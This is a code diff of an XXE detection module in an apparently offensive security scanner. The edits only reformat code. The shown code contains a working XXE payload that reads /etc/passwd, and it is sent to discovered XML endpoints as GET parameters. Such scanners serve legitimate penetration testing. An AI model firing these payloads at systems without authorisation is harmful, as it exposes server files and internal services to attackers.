@@ -95,9 +95,7 @@ XML_ENDPOINTS = [
 
 class Module(BaseModule):
     name = "xxe"
-    description = (
-        "XXE detector — file read, SSRF, XInclude, SVG, and PHP wrapper injection"
-    )
+    description = "XXE detector — file read, SSRF, XInclude, SVG, and PHP wrapper injection"
     author = "RedScope"
     version = "1.0.0"
 
@@ -117,9 +115,7 @@ class Module(BaseModule):
         self.log.info(f"  Found {len(endpoints)} XML-accepting endpoint(s)")
 
         if not endpoints:
-            self.log.warning(
-                "  No XML endpoints found — trying base URL with all content types"
-            )
+            self.log.warning("  No XML endpoints found — trying base URL with all content types")
             endpoints = [(base, "application/xml")]
 
         for endpoint, content_type in endpoints:
@@ -166,9 +162,7 @@ class Module(BaseModule):
                     )
                     if resp.status_code not in (404, 405):
                         found.append((url, ct))
-                        self.log.info(
-                            f"  [green]XML endpoint:[/] {url} ({ct}) → {resp.status_code}"
-                        )
+                        self.log.info(f"  [green]XML endpoint:[/] {url} ({ct}) → {resp.status_code}")
                         break
                 except requests.RequestException:
                     continue
@@ -196,9 +190,7 @@ class Module(BaseModule):
                 )
                 if pattern and re.search(pattern, resp.text, re.IGNORECASE):
                     match = re.search(pattern, resp.text, re.IGNORECASE)
-                    self.log.info(
-                        f"  [bold red]XXE CONFIRMED[/] {technique} via {method}"
-                    )
+                    self.log.info(f"  [bold red]XXE CONFIRMED[/] {technique} via {method}")
                     return Finding(
                         title=f"XXE Injection — {technique}",
                         severity=severity,
@@ -229,7 +221,9 @@ class Module(BaseModule):
 
     def _test_get_xml(self, session, base, timeout) -> Optional[Finding]:
         xml_params = ["xml", "data", "input", "body", "payload", "content"]
-        simple_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+        simple_payload = (
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+        )
         for param in xml_params:
             try:
                 resp = session.get(
